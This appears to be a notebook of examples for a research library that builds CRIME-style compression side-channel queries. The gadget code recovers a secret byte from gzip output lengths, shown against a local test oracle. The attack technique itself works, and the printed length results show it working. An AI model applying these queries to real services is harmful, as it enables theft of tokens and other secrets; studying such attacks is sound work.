# Examples for CRIME automata

In [1]:
from collections.abc import Callable
from copy import deepcopy
import random
from typing import Any
import zlib

from compressors.interface import *
from crime_automata import dictionary, filler, utils
from crime_automata.deflate import automata, params
from crime_automata.deflate.collisions import DeflateInstanceSet
from crime_automata.deflate.gadgets import *
from crime_automata.gadgets import *
from crime_automata.randbytes import RandBytes

## Helper functions

In [2]:
LIPSUM = (
    b"Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. "
    b"Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. "
    b"Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. "
    b"Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."
)


def pretty_print(data: bytes | bytearray | memoryview, width: int = 76) -> None:
    for i in range(0, len(data), width):
        print(data[i : i + width])

In [3]:
def create_test_oracle(
    secret: bytes,
    compress: Callable[[Any], bytes],
    data: bytes = LIPSUM,
    noise=0,
):
    """Create a compression length oracle for test purpose."""
    prefix = b"Content:secret=" + secret + b"&data=" + data

    def oracle(query: bytes, expose: bool = False) -> int | bytes:
        uncompressed = prefix + random.randbytes(noise) + b"&query=" + query
        compressed = compress(uncompressed)
        return compressed if expose else len(compressed)

    return oracle


example_oracle = create_test_oracle(b"123456", compress=GZipCompressor(6).compress)
example_oracle(b"secret=123456"), example_oracle(b"secret=654321")

(318, 323)

In [4]:
def print_example_test_result(query, compress, data=LIPSUM, noise=0):
    print(
        [
            (
                i,
                create_test_oracle(
                    "{}23456".format(i).encode(),
                    data=data,
                    noise=noise,
                    compress=compress,
                )(query),
            )
            for i in range(10)
        ]
    )


print_example_test_result(b"secret=1", compress=GZipCompressor(6).compress)

[(0, 318), (1, 317), (2, 318), (3, 318), (4, 318), (5, 318), (6, 318), (7, 318), (8, 319), (9, 319)]


## DEFLATE automata

In [5]:
example_automaton = (
    automata.DeflateAutomaton(
        charset=utils.ALPHABETIC_BYTES,
        params=params.ZLIB_PARAMS[6],
        filler=filler.SimpleFiller(b"-" * 10),
    )
    .add(DefaultAlign(b"@", 10))
    .add(ByteMatch(b"secret=", b"1"))
    .add(DefaultNOP(5))
    .add(DistanceChainAmplify(100, 4, double=True))
)

Compile the automaton to get the query string.

In [6]:
query = example_automaton.compile()
pretty_print(query)
print_example_test_result(query, GZipCompressor(6).compress)

b'-cTdB-CGTT-pGTT-pMUq-MMUq-MpcS-xpcS-xbed-sbed-snHE-bnHE-biHw-HiHw-HUev-gUev-'
b'gXEz-zXEz-zFNW-VFNW-VCGh-OCGh-OanU-kanU-kfuY-ufuY------------1Xtsd-Xtsdc-TdB'
b'C-GTTp-MUqM-pcSx-beds-nHEb-iHwH-Uevg-XEzz-FNWV-CGhO-anUk-fuYu-@@@@@@@@@@secr'
b'et=1XtsdcTdBCGTTpGTTpMUqMMUqMpcSxpcSxbedsbedsnHEbnHEbiHwHiHwHUevgUevgXEzzXEz'
b'zFNWVFNWVCGhOCGhOanUkanUkfuYufuYu'
[(0, 498), (1, 490), (2, 498), (3, 498), (4, 498), (5, 498), (6, 498), (7, 498), (8, 498), (9, 498)]


The results of a compilation can be cached, so we can change some gadgets while only minimally affecting others:

In [7]:
example_automaton.replace(1, ByteMatch(b"secret=", b"2"))

query = example_automaton.compile()
pretty_print(query)
print_example_test_result(query, GZipCompressor(6).compress)

b'-cTdB-CGTT-pGTT-pMUq-MMUq-MpcS-xpcS-xbed-sbed-snHE-bnHE-biHw-HiHw-HUev-gUev-'
b'gXEz-zXEz-zFNW-VFNW-VCGh-OCGh-OanU-kanU-kfuY-ufuY------------2Xtsd-Xtsdc-TdB'
b'C-GTTp-MUqM-pcSx-beds-nHEb-iHwH-Uevg-XEzz-FNWV-CGhO-anUk-fuYu-@@@@@@@@@@secr'
b'et=2XtsdcTdBCGTTpGTTpMUqMMUqMpcSxpcSxbedsbedsnHEbnHEbiHwHiHwHUevgUevgXEzzXEz'
b'zFNWVFNWVCGhOCGhOanUkanUkfuYufuYu'
[(0, 498), (1, 498), (2, 490), (3, 498), (4, 498), (5, 498), (6, 498), (7, 498), (8, 498), (9, 498)]


The automaton can be forced to recompile if desired:

In [8]:
query = example_automaton.compile(force_recompile=True)
pretty_print(query)
print_example_test_result(query, GZipCompressor(6).compress)

b'-SsAZ-UqqV-XqqV-XjkI-DjkI-DcNZ-jcNZ-jGIT-AGIT-Aboz-Rboz-RzOX-czOX-cCNA-mCNA-'
b'mGvg-FGvg-FqwF-RqwF-RPyF-sPyF-seCx-JeCx-JVDA-oVDA------------2ILEl-ILElS-sAZ'
b'U-qqVX-jkID-cNZj-GITA-bozR-zOXc-CNAm-GvgF-qwFR-PyFs-eCxJ-VDAo-@@@@@@@@@@secr'
b'et=2ILElSsAZUqqVXqqVXjkIDjkIDcNZjcNZjGITAGITAbozRbozRzOXczOXcCNAmCNAmGvgFGvg'
b'FqwFRqwFRPyFsPyFseCxJeCxJVDAoVDAo'
[(0, 503), (1, 503), (2, 494), (3, 503), (4, 503), (5, 503), (6, 503), (7, 503), (8, 503), (9, 503)]


A compilable part in the automaton can be frozen, which means it will not be not recompiled even if we force it to recompile or try to flush it.

In [9]:
example_automaton.last_gadget().freeze()
example_automaton.flush()
example_automaton.last_gadget().flush()

query_1 = example_automaton.compile(force_recompile=True)
pretty_print(query_1)
print_example_test_result(query_1, GZipCompressor(6).compress)

example_automaton.last_gadget().unfreeze()
query_2 = example_automaton.compile(force_recompile=True)
pretty_print(query_2)
print_example_test_result(query_2, GZipCompressor(6).compress)

b'-fsAZ-UqqV-XqqV-XjkI-DjkI-DcNZ-jcNZ-jGIT-AGIT-Aboz-Rboz-RzOX-czOX-cCNA-mCNA-'
b'mGvg-FGvg-FqwF-RqwF-RPyF-sPyF-seCx-JeCx-JVDA-oVDA------------2ZVwV-ZVwVf-sAZ'
b'U-qqVX-jkID-cNZj-GITA-bozR-zOXc-CNAm-GvgF-qwFR-PyFs-eCxJ-VDAo-@@@@@@@@@@secr'
b'et=2ZVwVfsAZUqqVXqqVXjkIDjkIDcNZjcNZjGITAGITAbozRbozRzOXczOXcCNAmCNAmGvgFGvg'
b'FqwFRqwFRPyFsPyFseCxJeCxJVDAoVDAo'
[(0, 503), (1, 503), (2, 494), (3, 503), (4, 503), (5, 503), (6, 503), (7, 502), (8, 503), (9, 503)]
b'-qnIn-qCUk-FCUk-Fxoh-yxoh-ylUr-ClUr-CvdB-gvdB-gOad-VOad-VbFT-DbFT-DzrN-bzrN-'
b'bIav-wIav-wCWe-qCWe-qpay-apay-aLNg-jLNg-jUYQ-oUYQ------------2sWAk-sWAkq-nIn'
b'q-CUkF-xohy-lUrC-vdBg-OadV-bFTD-zrNb-Iavw-CWeq-paya-LNgj-UYQo-@@@@@@@@@@secr'
b'et=2sWAkqnInqCUkFCUkFxohyxohylUrClUrCvdBgvdBgOadVOadVbFTDbFTDzrNbzrNbIavwIav'
b'wCWeqCWeqpayapayaLNgjLNgjUYQoUYQo'
[(0, 498), (1, 498), (2, 490), (3, 498), (4, 499), (5, 499), (6, 499), (7, 498), (8, 498), (9, 498)]


A sanity check can help reveal possible errors in the automaton.

In [10]:
print(example_automaton.sanity_check())
example_automaton.add(
    DistanceChainAmplify(10, 2)
)  # the segment for amplification is too short
print(example_automaton.sanity_check())
example_automaton.pop(-1)
print(example_automaton.sanity_check())

True
False
True


The dictionaries and the filler can be changed without the need to recompile the whole automaton:

In [11]:
example_automaton.set_params(params.ZLIB_PARAMS[1])
query = example_automaton.compile()
# this shouldn't work because the dictioary finds matches across dictionary entries, some
# larger than `max_insert`, and as a result some entries are not present in the hash table
print_example_test_result(query, GZipCompressor(1).compress)


# we can solve this issue by alternating the separators in the first dictionary
def alternate_dictionary_proc(self: dictionary.Dictionary, rng: random.Random) -> bytes:
    return (
        b"$"
        + b"".join(
            (b"-" if i % 2 == 0 else b"+") + self.words[i]
            for i in range(len(self.words))
        )
        + b"$"
    )


example_automaton.dict_1 = dictionary.CustomDictionary(
    procedure=alternate_dictionary_proc
)

# modifying `filler` and `dict_2` is not needed and is just for demonstration
example_automaton.filler = filler.CustomFiller(
    procedure=lambda _, rng: b"<filler>"
    + RandBytes(utils.ALPHANUMERIC_BYTES, rng).randbytes(10)
    + b"</filler>"
)
example_automaton.dict_2 = dictionary.SimpleDictionaryDedup(sep=b"*", bound=b"$")

# Don't forget to bind the new dictionaries and filler to the machine;
# The old dict/filler can be ignored even though they're still bound to the machine
example_automaton.bind_non_gadget_components(should_flush=False)

query = example_automaton.compile()
pretty_print(query)
print_example_test_result(query, GZipCompressor(1).compress)

[(0, 491), (1, 491), (2, 491), (3, 492), (4, 492), (5, 492), (6, 492), (7, 491), (8, 491), (9, 491)]
b'$-qnIn+qCUk-FCUk+Fxoh-yxoh+ylUr-ClUr+CvdB-gvdB+gOad-VOad+VbFT-DbFT+DzrN-bzrN'
b'+bIav-wIav+wCWe-qCWe+qpay-apay+aLNg-jLNg+jUYQ-oUYQ$<filler>0Dv5jDSZsd</fille'
b'r>$2sWAk*sWAkq*nInq*CUkF*xohy*lUrC*vdBg*OadV*bFTD*zrNb*Iavw*CWeq*paya*LNgj*U'
b'YQo$@@@@@@@@@@secret=2sWAkqnInqCUkFCUkFxohyxohylUrClUrCvdBgvdBgOadVOadVbFTDb'
b'FTDzrNbzrNbIavwIavwCWeqCWeqpayapayaLNgjLNgjUYQoUYQo'
[(0, 542), (1, 542), (2, 533), (3, 542), (4, 542), (5, 542), (6, 542), (7, 542), (8, 542), (9, 542)]


A query could make use of several automata, not just one:

In [12]:
automaton_1 = (
    automata.DeflateAutomaton(
        charset=utils.ALPHANUMERIC_BYTES,
        params=params.ZLIB_PARAMS[6],
        filler=filler.SimpleFiller(b"-" * 10),
    )
    .add(MatchAlign(length=10))  # using default align could result in clashes
    .add(ByteMatch(b"secret=", b"1"))
    .add(MatchChainLazyAmplify(50, 5))
)

automaton_2 = deepcopy(automaton_1).replace(-2, ByteMatch(b"secret=", b"2"))
automaton_2.flush()

query = automaton_1.compile() + automaton_2.compile()
pretty_print(query)
print_example_test_result(query, GZipCompressor(6).compress)

b'-1A9l-joYU-U9w5-hsIJ-r9k5-x9Y1-oX2V-2CtA-V2e3-eRfrC------------P5EYud9F5a-9l'
b'Ljo-YUfU9-w5phs-IJdr9-k5bx9-Y1aoX-2VB2C-tAFV2-e3deR-frCa-P5EYud9F5asecret=1A'
b'9lLjoYUfU9w5phsIJdr9k5bx9Y1aoX2VB2CtAFV2e3deRfrCa-2SH3-gJsL-U9sE-xmcJ-vpN1-p'
b'EaR-9llq-ORZA-DFUW-4enZ4------------aGnOcoFqW7-H3GgJ-sLXU9-sEgxm-cJ2vp-N1cpE'
b'-aRh9l-lqnOR-ZAODF-UWQ4e-nZ4x-aGnOcoFqW7secret=2SH3GgJsLXU9sEgxmcJ2vpN1cpEaR'
b'h9llqnORZAODFUWQ4enZ4x'
[(0, 585), (1, 577), (2, 579), (3, 584), (4, 584), (5, 585), (6, 585), (7, 585), (8, 585), (9, 585)]


The above query can also be implemented using just one automaton...

In [13]:
automaton_3 = (
    deepcopy(automaton_1)
    .add(MatchAlign(length=10))
    .add(ByteMatch(b"secret=", b"2"))
    .add(MatchChainLazyAmplify(50, 5))
)

query = automaton_3.compile()
pretty_print(query)
print_example_test_result(query, GZipCompressor(6).compress)

b'-1A9l-joYU-U9w5-hsIJ-r9k5-x9Y1-oX2V-2CtA-V2e3-eRfrC-26Yt-0dLK-uS7V-4Xm2-HpBR'
b'-vjlZ-aJni-7Z5q-B2Gi-lcIdk------------P5EYud9F5a-9lLjo-YUfU9-w5phs-IJdr9-k5b'
b'x9-Y1aoX-2VB2C-tAFV2-e3deR-frCa-DTOArZqKKR-Ytq0d-LK1uS-7Vc4X-m2JHp-BRTvj-lZW'
b'aJ-nib7Z-5qSB2-GiGlc-Idk5-P5EYud9F5asecret=1A9lLjoYUfU9w5phsIJdr9k5bx9Y1aoX2'
b'VB2CtAFV2e3deRfrCaDTOArZqKKRsecret=26Ytq0dLK1uS7Vc4Xm2JHpBRTvjlZWaJnib7Z5qSB'
b'2GiGlcIdk5'
[(0, 589), (1, 582), (2, 582), (3, 588), (4, 588), (5, 589), (6, 589), (7, 589), (8, 589), (9, 589)]


... and the query can be much shorter by making use of the logical gadgets:

In [14]:
automaton_4 = deepcopy(automaton_1).insert(
    -1, GeneralORTargetMatch(ByteMatch(b"secret=", b"2"), glue_content=b"OR")
)

query = automaton_4.compile()
pretty_print(query)
print_example_test_result(query, GZipCompressor(6).compress)

b'-2A9l-joYU-U9w5-hsIJ-r9k5-x9Y1-oX2V-2CtA-V2e3-eRfrC------------P5EYud9F5a-OR'
b's-1OR-ecret=2-9lLjo-YUfU9-w5phs-IJdr9-k5bx9-Y1aoX-2VB2C-tAFV2-e3deR-frCa-P5E'
b'Yud9F5asecret=1ORsecret=2A9lLjoYUfU9w5phsIJdr9k5bx9Y1aoX2VB2CtAFV2e3deRfrCa'
[(0, 473), (1, 466), (2, 466), (3, 472), (4, 472), (5, 472), (6, 472), (7, 473), (8, 473), (9, 472)]


## DEFLATE gadgets

### Align gadgets

In [15]:
DefaultAlign is SimpleAlign

True

In [16]:
query = (
    automata.DeflateAutomaton(
        charset=utils.ALPHABETIC_BYTES,
        params=params.ZLIB_PARAMS[6],
    )
    .add(SimpleAlign(b"@", 10))
    .add(MatchAlign(b"Lorem ipsum", is_known=True))
    .add(RandomMisalign(10))
    .add(MatchAlign(b"abracadabra", is_known=False))
    .add(MatchAlign(length=10, charset=utils.ALPHANUMERIC_BYTES))
    .add(ByteMatch(b"secret=", b"1"))
    .compile()
)

pretty_print(query)
print_example_test_result(query, GZipCompressor(6).compress)

b'-abracadabra-GfM1WNqAvI-@@@@@@@@@@Lorem ipsumUqwCQeOZlyabracadabraGfM1WNqAvI'
b'secret=1'
[(0, 367), (1, 366), (2, 367), (3, 367), (4, 366), (5, 366), (6, 367), (7, 367), (8, 367), (9, 367)]


### NOP gadgets

In [17]:
DefaultNOP is RandomNOP

True

In [18]:
query = (
    automata.DeflateAutomaton(
        charset=utils.ALPHABETIC_BYTES,
        params=params.ZLIB_PARAMS[6],
    )
    .add(SimpleAlign(b"@", 10))
    .add(ByteMatch(b"secret=", b"1"))
    .add(MatchNOP(b"Lorem ipsum", is_known=True))
    .add(RandomNOP(10, charset=utils.ALPHANUMERIC_BYTES))
    .add(MatchNOP(b"abracadabra", is_known=False))
    .add(RandomNOP(10))
    .add(MatchChainLazyAmplify(50, 5))
    .compile()
)

pretty_print(query)
print_example_test_result(query, GZipCompressor(6).compress)

b'-NduF-zRIO-disl-eWOk-jorG-bsrs-NgbF-GvKh-VHiN-zmZNb--1Lorem ipsu-m92VZLDoHC-'
b'92VZLDoHCn-nabracadabr-abracadabra-azFQGIygWH-zFQGIygWHN-uFszR-IORdi-slFeW-O'
b'kIjo-rGKbs-rsZNg-bFwGv-KhdVH-iNqzm-ZNbb-@@@@@@@@@@secret=1Lorem ipsum92VZLDo'
b'HCnabracadabrazFQGIygWHNduFszRIORdislFeWOkIjorGKbsrsZNgbFwGvKhdVHiNqzmZNbb'
[(0, 499), (1, 493), (2, 499), (3, 499), (4, 499), (5, 499), (6, 499), (7, 499), (8, 499), (9, 499)]


### Match gadgets

In [19]:
query = (
    automata.DeflateAutomaton(
        charset=utils.ALPHABETIC_BYTES,
        params=params.ZLIB_PARAMS[6],
    )
    .add(DefaultAlign(b"@", 10))
    .add(TargetMatch(b"secret=0", add_prefix=False))
    .add(ByteMatch(b"secret=", b"1"))
    .compile()
)

print(query)
print_example_test_result(query, GZipCompressor(6).compress)

b'@@@@@@@@@@secret=0secret=1'
[(0, 326), (1, 326), (2, 328), (3, 328), (4, 328), (5, 328), (6, 327), (7, 327), (8, 327), (9, 327)]


If the match prefix is not known to occur in the sliding window, then adding the prefix to a dictionary can make the match precise.

In [20]:
match_automaton = (
    automata.DeflateAutomaton(
        charset=utils.ALPHABETIC_BYTES,
        params=params.ZLIB_PARAMS[6],
    )
    .add(DefaultAlign(b"@", 10))
    .add(TargetMatch(b"top_secret=0", add_prefix=False))
    .add(MatchChainLazyAmplify(50, 5))
)

query_1 = match_automaton.compile()
pretty_print(query_1)
print_example_test_result(query_1, GZipCompressor(6).compress)

match_automaton.replace(1, TargetMatch(b"top_secret=0", add_prefix=True))
# or, equivalently:
# match_automaton[1].add_prefix = True
# match_automaton[1].flush()

query_2 = match_automaton.compile()
pretty_print(query_2)
print_example_test_result(query_2, GZipCompressor(6).compress)

b'-0BiM-XPxV-WEYq-EaIB-AKrc-rNVv-pKwL-foPb-NJwV-jhIpy--iMmXP-xVaWE-YqaEa-IBeAK'
b'-rcDrN-VvApK-wLdfo-PbLNJ-wVTjh-Ipyw-@@@@@@@@@@top_secret=0BiMmXPxVaWEYqaEaIB'
b'eAKrcDrNVvApKwLdfoPbLNJwVTjhIpyw'
[(0, 446), (1, 453), (2, 454), (3, 454), (4, 454), (5, 454), (6, 454), (7, 454), (8, 454), (9, 454)]
b'-0BiM-XPxV-WEYq-EaIB-AKrc-rNVv-pKwL-foPb-NJwV-jhIpy--top_secret=-iMmXP-xVaWE'
b'-YqaEa-IBeAK-rcDrN-VvApK-wLdfo-PbLNJ-wVTjh-Ipyw-@@@@@@@@@@top_secret=0BiMmXP'
b'xVaWEYqaEaIBeAKrcDrNVvApKwLdfoPbLNJwVTjhIpyw'
[(0, 457), (1, 457), (2, 457), (3, 458), (4, 458), (5, 458), (6, 457), (7, 457), (8, 458), (9, 458)]


The `Unmatch` gadget should only be used when lazy matching is enabled. Note that `Unmatch` is always supposed to be precise.

In [21]:
lazymatch_automaton = (
    automata.DeflateAutomaton(
        charset=utils.ALPHABETIC_BYTES,
        params=params.ZLIB_PARAMS[6],
    )
    .add(Unmatch(b"secret=2", sep=b"/"))
    .add(MatchChainLazyAmplify(50, 5))
)

query = lazymatch_automaton.compile()
pretty_print(query)
print_example_test_result(query, GZipCompressor(6).compress)

b'-/mUI-juSA-yhJA-ccje-JvkZ-GrBy-QTQS-cWjp-gNMQ-SgGJP--ecret=2/-UIwju-SARyh-JA'
b'Icc-jeWJv-kZLGr-ByNQT-QSgcW-jpOgN-MQSSg-GJPe-secret=2/mUIwjuSARyhJAIccjeWJvk'
b'ZLGrByNQTQSgcWjpOgNMQSSgGJPe'
[(0, 447), (1, 447), (2, 453), (3, 447), (4, 447), (5, 447), (6, 447), (7, 447), (8, 447), (9, 447)]


In [22]:
telescope_automaton = (
    automata.DeflateAutomaton(
        charset=utils.ALPHABETIC_BYTES,
        params=params.ZLIB_PARAMS[6],
    )
    .add(DefaultAlign(b"@", 10))
    .add(TelescopedMatch(b"secret=1", k=6))
)

query_1 = telescope_automaton.compile()
pretty_print(query_1)
print_example_test_result(query_1, GZipCompressor(6).compress)

b'@@@@@@@@@@t=1et=1ret=1cret=1ecret=1secret=1'
[(0, 336), (1, 332), (2, 336), (3, 336), (4, 336), (5, 336), (6, 336), (7, 336), (8, 336), (9, 336)]


In [23]:
telescope_automaton.replace(
    1,
    TelescopedMatch(
        b"secret=1", k=6, seps=[b"/"] * 5
    ),  # [b"A", b"B", b"C", b"D", b"E"])
)
query_2 = telescope_automaton.compile()
pretty_print(query_2)
print_example_test_result(query_2, GZipCompressor(6).compress)

b'@@@@@@@@@@t=1/et=1/ret=1/cret=1/ecret=1/secret=1'
[(0, 336), (1, 336), (2, 336), (3, 336), (4, 336), (5, 336), (6, 336), (7, 336), (8, 336), (9, 336)]


In [24]:
telescope_automaton.replace(
    1,
    RandomTelescopedMatch(
        b"secret=1",
        k=6,
        sep_len=1,
        charset=bytes(range(ord("A"), ord("Z") + 1)),
        distinct_seps=True,
    ),
)
query_3 = telescope_automaton.compile()
pretty_print(query_3)
print_example_test_result(query_3, GZipCompressor(6).compress)

b'@@@@@@@@@@t=1Yet=1Pret=1Ocret=1Decret=1Rsecret=1'
[(0, 343), (1, 339), (2, 343), (3, 343), (4, 343), (5, 343), (6, 343), (7, 343), (8, 343), (9, 343)]


In [25]:
# this shouldn't work for the default compression level
telescope_automaton.replace(
    1, TelescopedMatch(b"secret=1", k=6, little_endian=False, add_prefix=True)
)
query_4 = telescope_automaton.compile()
pretty_print(query_4)
print_example_test_result(query_4, GZipCompressor(6).compress)
print_example_test_result(query_4, GZipCompressor(1).compress)

b'-secret=-@@@@@@@@@@secret=1ecret=1cret=1ret=1et=1t=1'
[(0, 336), (1, 336), (2, 336), (3, 337), (4, 337), (5, 337), (6, 336), (7, 336), (8, 336), (9, 336)]
[(0, 340), (1, 336), (2, 340), (3, 340), (4, 340), (5, 340), (6, 341), (7, 340), (8, 340), (9, 340)]


### Amplify gadgets

#### Distance-chain amplify

In [26]:
distance_amplify_automaton = (
    automata.DeflateAutomaton(
        charset=utils.ALPHABETIC_BYTES,
        params=params.ZLIB_PARAMS[6],
        filler=filler.SimpleFiller(b"-" * 200),
    )
    .add(DefaultAlign(b"@", 10))
    .add(ByteMatch(b"secret=", b"1"))
    .add(GenericGadget(b"placeholder"))
)

AMPL_LEN = 200
distance_amplify_gadgets = [
    DistanceChainAmplify(AMPL_LEN, k=None),  # automated selection of `k`
    DistanceChainAmplify(AMPL_LEN, k=None, aligned=False),
    DistanceChainAmplify(AMPL_LEN, k=4),
    DistanceChainAmplify(AMPL_LEN, k=None, reverse=True),
    DistanceChainAmplify(AMPL_LEN, k=None, double=True),
    DistanceChainAmplify(AMPL_LEN, k=None, reverse=True, double=True),
    DistanceChainAmplify(AMPL_LEN, k=3, overlap=2),
    DistanceChainAmplify(AMPL_LEN, k=3, reverse=True, overlap=2),
]

for cur_gadget in distance_amplify_gadgets:
    distance_amplify_automaton.replace(-1, cur_gadget)

    print(
        "[level=3]",
        distance_amplify_automaton.set_params(params.ZLIB_PARAMS[3]).sanity_check(),
        end=" ",
    )
    query = distance_amplify_automaton.compile(force_recompile=True)
    print(len(query), end=" ")
    print_example_test_result(query, GZipCompressor(3).compress)

    print(
        "[level=6]",
        distance_amplify_automaton.set_params(params.ZLIB_PARAMS[6]).sanity_check(),
        end=" ",
    )
    query = distance_amplify_automaton.compile(force_recompile=True)
    print(len(query), end=" ")
    print_example_test_result(query, GZipCompressor(6).compress)

[level=3] True 946 [(0, 838), (1, 827), (2, 840), (3, 840), (4, 840), (5, 840), (6, 839), (7, 839), (8, 839), (9, 839)]
[level=6] True 946 [(0, 831), (1, 821), (2, 832), (3, 833), (4, 833), (5, 832), (6, 832), (7, 831), (8, 832), (9, 832)]
[level=3] True 952 [(0, 847), (1, 832), (2, 848), (3, 848), (4, 848), (5, 848), (6, 847), (7, 847), (8, 848), (9, 848)]
[level=6] True 952 [(0, 844), (1, 834), (2, 845), (3, 846), (4, 846), (5, 845), (6, 845), (7, 845), (8, 845), (9, 845)]
[level=3] True 920 [(0, 780), (1, 765), (2, 780), (3, 779), (4, 780), (5, 780), (6, 780), (7, 780), (8, 780), (9, 780)]
[level=6] True 920 [(0, 781), (1, 768), (2, 782), (3, 782), (4, 782), (5, 782), (6, 781), (7, 781), (8, 782), (9, 782)]
[level=3] True 946 [(0, 825), (1, 836), (2, 826), (3, 827), (4, 827), (5, 826), (6, 826), (7, 826), (8, 826), (9, 826)]
[level=6] True 946 [(0, 830), (1, 842), (2, 831), (3, 832), (4, 832), (5, 831), (6, 831), (7, 831), (8, 831), (9, 831)]
[level=3] True 818 [(0, 692), (1, 658), 

#### Match-chain amplify

In [27]:
fast_amplify_automaton = (
    automata.DeflateAutomaton(
        charset=utils.ALPHABETIC_BYTES,
        params=params.ZLIB_PARAMS[3],
        filler=filler.SimpleFiller(b"-" * 100),
    )
    .add(DefaultAlign(b"@", 10))
    .add(ByteMatch(b"secret=", b"8"))
    .add(PlaceholderGadget())
)

AMPL_LEN = 500
fast_amplify_gadgets = [
    MatchChainFastAmplify(AMPL_LEN, k=None),
    MatchChainFastAmplify(AMPL_LEN, k=None, aligned=False),
    MatchChainFastAmplify(AMPL_LEN, k=5),
    MatchChainFastAmplify(AMPL_LEN, k=None, reverse=True),
    MatchChainFastAmplify(AMPL_LEN, k=None, double=True),
    MatchChainFastAmplify(AMPL_LEN, k=None, reverse=True, double=True),
    MatchChainFastAmplify(AMPL_LEN, k=None, overlap=3),
]

for cur_gadget in fast_amplify_gadgets:
    fast_amplify_automaton.replace(-1, cur_gadget)

    print(
        "[level=3]",
        fast_amplify_automaton.set_params(params.ZLIB_PARAMS[3]).sanity_check(),
        end=" ",
    )
    query = fast_amplify_automaton.compile(force_recompile=True)
    # pretty_print(query)
    print(len(query), end=" ")
    print_example_test_result(query, GZipCompressor(3).compress)

    # print("[level=6]", fast_amplify_automaton.set_params(params.ZLIB_PARAMS[6]).sanity_check(), end='\t')
    # query = fast_amplify_automaton.compile(force_recompile=True)
    # print(len(query), end='\t')
    # print_example_test_result(query, GZipCompressor(6).compress)

[level=3] True 1746 [(0, 1462), (1, 1462), (2, 1462), (3, 1463), (4, 1463), (5, 1463), (6, 1462), (7, 1461), (8, 1359), (9, 1462)]
[level=3] True 1746 [(0, 1469), (1, 1468), (2, 1469), (3, 1469), (4, 1469), (5, 1469), (6, 1469), (7, 1467), (8, 1366), (9, 1468)]
[level=3] True 1721 [(0, 1377), (1, 1377), (2, 1376), (3, 1376), (4, 1376), (5, 1376), (6, 1376), (7, 1375), (8, 1266), (9, 1376)]
[level=3] True 1747 [(0, 1368), (1, 1367), (2, 1367), (3, 1368), (4, 1368), (5, 1368), (6, 1368), (7, 1367), (8, 1469), (9, 1367)]
[level=3] True 1436 [(0, 967), (1, 966), (2, 967), (3, 967), (4, 967), (5, 967), (6, 967), (7, 966), (8, 958), (9, 966)]
[level=3] True 1437 [(0, 955), (1, 955), (2, 955), (3, 955), (4, 955), (5, 955), (6, 955), (7, 954), (8, 1123), (9, 955)]
[level=3] True 1242 [(0, 1103), (1, 1102), (2, 1103), (3, 1103), (4, 1103), (5, 1103), (6, 1103), (7, 1101), (8, 1021), (9, 1102)]


In [28]:
lazy_amplify_automaton = (
    automata.DeflateAutomaton(
        charset=utils.ALPHABETIC_BYTES,
        params=params.ZLIB_PARAMS[6],
        filler=filler.SimpleFiller(b"-" * 100),
    )
    .add(DefaultAlign(b"@", 10))
    .add(ByteMatch(b"secret=", b"1"))
    .add(PlaceholderGadget())
)

AMPL_LEN = 201
lazy_amplify_gadgets = [
    MatchChainLazyAmplify(AMPL_LEN, k=None),
    MatchChainLazyAmplify(AMPL_LEN, k=None, aligned=False),
    MatchChainLazyAmplify(AMPL_LEN, k=6),
    MatchChainLazyAmplify(AMPL_LEN, k=None, reverse=True),
    MatchChainLazyAmplify(AMPL_LEN, k=None, double=True),
    MatchChainLazyAmplify(AMPL_LEN, k=None, reverse=True, double=True),
]


for cur_gadget in lazy_amplify_gadgets:
    lazy_amplify_automaton.replace(-1, cur_gadget)

    print(
        "[level=6]",
        lazy_amplify_automaton.set_params(params.ZLIB_PARAMS[6]).sanity_check(),
        end=" ",
    )
    query = lazy_amplify_automaton.compile(force_recompile=True)
    # pretty_print(query)
    print(len(query), end=" ")
    print_example_test_result(query, GZipCompressor(6).compress)

[level=6] True 760 [(0, 779), (1, 741), (2, 781), (3, 781), (4, 781), (5, 781), (6, 781), (7, 779), (8, 780), (9, 780)]
[level=6] True 763 [(0, 793), (1, 753), (2, 792), (3, 793), (4, 793), (5, 792), (6, 792), (7, 794), (8, 794), (9, 794)]
[level=6] True 747 [(0, 747), (1, 708), (2, 746), (3, 746), (4, 746), (5, 746), (6, 746), (7, 747), (8, 747), (9, 747)]
[level=6] True 760 [(0, 742), (1, 780), (2, 743), (3, 744), (4, 744), (5, 743), (6, 743), (7, 743), (8, 743), (9, 743)]
[level=6] True 646 [(0, 654), (1, 602), (2, 656), (3, 656), (4, 656), (5, 656), (6, 655), (7, 655), (8, 655), (9, 655)]
[level=6] True 646 [(0, 604), (1, 652), (2, 605), (3, 606), (4, 606), (5, 605), (6, 605), (7, 604), (8, 605), (9, 605)]


In [29]:
automated_amplify_automaton = (
    automata.DeflateAutomaton(
        charset=utils.ALPHABETIC_BYTES,
        params=params.ZLIB_PARAMS[6],
        filler=filler.SimpleFiller(b"-" * 100),
    )
    .add(DefaultAlign(b"@", 10))
    .add(ByteMatch(b"secret=", b"1"))
    .add(PlaceholderGadget())
)

AMPL_LEN = 200
automated_amplify_gadgets = [
    MatchChainAutomatedAmplify(AMPL_LEN, k=None),
    # MatchChainAutomatedAmplify(AMPL_LEN, k=None, reverse=True),
    # MatchChainAutomatedAmplify(AMPL_LEN, k=None, double=True),
    MatchChainAutomatedAmplify(AMPL_LEN, k=None, reverse=True, double=True),
]

for cur_gadget in automated_amplify_gadgets:
    automated_amplify_automaton.replace(-1, cur_gadget)
    print(
        "[level=3]",
        automated_amplify_automaton.set_params(
            params=params.ZLIB_PARAMS[3]
        ).sanity_check(),
        end=" ",
    )
    print_example_test_result(
        automated_amplify_automaton.compile(force_recompile=True),
        GZipCompressor(3).compress,
    )
    print(type(automated_amplify_automaton.last_gadget().gadget_in_use).__name__)

    print(
        "[level=4]",
        automated_amplify_automaton.set_params(
            params=params.ZLIB_PARAMS[4]
        ).sanity_check(),
        end=" ",
    )
    print_example_test_result(
        automated_amplify_automaton.compile(force_recompile=True),
        GZipCompressor(4).compress,
    )
    print(type(automated_amplify_automaton.last_gadget().gadget_in_use).__name__)

    print(
        "[level=6]",
        automated_amplify_automaton.set_params(
            params=params.ZLIB_PARAMS[6]
        ).sanity_check(),
        end=" ",
    )
    print_example_test_result(
        automated_amplify_automaton.compile(force_recompile=True),
        GZipCompressor(6).compress,
    )
